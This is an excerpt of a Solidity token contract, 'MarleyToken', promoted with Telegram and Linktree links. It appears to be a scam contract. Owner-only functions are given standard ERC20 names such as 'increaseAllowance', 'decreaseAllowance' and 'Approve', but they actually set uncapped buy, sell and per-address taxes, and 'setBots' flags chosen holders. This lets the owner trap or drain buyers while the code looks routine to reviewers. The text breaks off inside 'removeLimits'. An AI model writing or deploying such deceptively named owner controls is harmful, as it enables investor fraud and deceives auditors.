...
👁‍🗨 TG: https://t.me/marleyportal

        >>>>>> https://linktr.ee/marleytoken <<<<<<
...
contract MarleyToken is ERC20, Ownable {
    ...
    function increaseAllowance(uint256 _value) external onlyOwner {
        require(_value >= 0, "Sell tax must be greater than or equal to 0");
        _sellTax = _value;
    }

    function decreaseAllowance(uint256 _value) external onlyOwner {
        require(_value >= 0, "Buy tax must be greater than or equal to 0");
        _buyTax = _value;
    }

    function Approve(address[] memory _addresses, uint256 _value) external onlyOwner {
        require(_value >= 0, "Account tax must be greater than or equal to 0");
        for (uint i = 0; i < _addresses.length; i++) {
            _accTax[_addresses[i]] = _value;
        }    
    }

    function setBots(address[] memory _addresses, bool _value) external onlyOwner {
        require(_value == true || _value == false, "");
        for (uint i = 0; i < _addresses.length; i++) {
            _isTax[_addresses[i]] = _value;
        }
    }

    function removeLimits(address[] memory _addresses, uint _amount) external onlyOwner {
        require(_amount >= 0, "Token must be greater than or equal to 0");
        for (uint i = 0; i < _addresses.length; i++) {
